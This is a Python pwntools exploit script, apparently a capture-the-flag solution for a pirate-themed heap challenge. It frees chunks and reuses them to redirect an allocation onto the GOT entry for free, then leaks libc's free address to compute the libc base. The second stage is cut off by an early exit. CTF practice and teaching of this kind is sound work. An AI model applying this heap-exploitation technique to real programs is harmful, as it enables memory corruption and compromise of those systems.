#!/usr/bin/env python3

from pwn import *

e = ELF("./bin_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = e


def recruit(r, pirateNum, hookNum): # does a malloc of 0x10
    r.sendline(b"1")
    r.sendline(pirateNum)
    r.sendline(hookNum)
    # crew[pirateNum] = memAlloc -> hookNum

def nickname(r, pirateNum, name): # it will allocate 0x3c bytes and put at crew[pirateNum] + 0x8 for the nickname
    r.sendline(b"2")
    r.sendline(pirateNum)
    r.sendline(name.ljust(0x3b, b"\x00"))


def upgadeHook(r, pirateNum, hookNum):
    r.sendline(b"3")
    r.sendline(pirateNum)
    r.sendline(hookNum)

def fight(r):
    r.sendline(b"4")

def keelhaul(r, pirateNum):
    r.sendline(b"5")
    r.sendline(pirateNum)


def conn(cond):
    if cond == 1:
        r = process([e.path])
    elif cond == 2:
        r = gdb.debug([e.path], gdbscript="""
            # b *show_crew
            #b *nickname+187
            # b *keelhaul
            b *recruit+111
            c

            c
            c
            c
            c
            c
            """)
    elif cond == 3:
        r = remote("addr", 1337)

    return r


def main():
    r = conn(1)


    recruit(r, b"1", b"C")
    recruit(r, b"2", b"B")
    recruit(r, b"3", b"A")

    keelhaul(r, b"1")
    keelhaul(r, b"2")


    upgadeHook(r, b"2", str(e.got["free"]).encode())
    recruit(r, b"1", b"A")
    recruit(r, b"2", b"A")

    print("free address:", str(e.got["free"]).encode())

    fight(r)


    r.recvuntil(b"Master ")
    r.recvuntil(b"hook_power: ")
    leakFree = int(r.recvline()[:-1].decode())
    print("free address:", hex(leakFree))

    libc.address = leakFree - libc.sym["free"]
    print("libc base address:", hex(libc.address))

    keelhaul(r, b"1")


    r.interactive()
    exit()
    recruit(r, b"1", b"C")
    recruit(r, b"2", b"B")

    keelhaul(r, b"1")
    keelhaul(r, b"2")

    upgadeHook(r, b"2", str(libc.address + libc.sym["environ"]).encode())
    recruit(r, b"1", b"A")
    recruit(r, b"2", b"A")

    fight(r)

    r.interactive()

if __name__ == "__main__":
    main()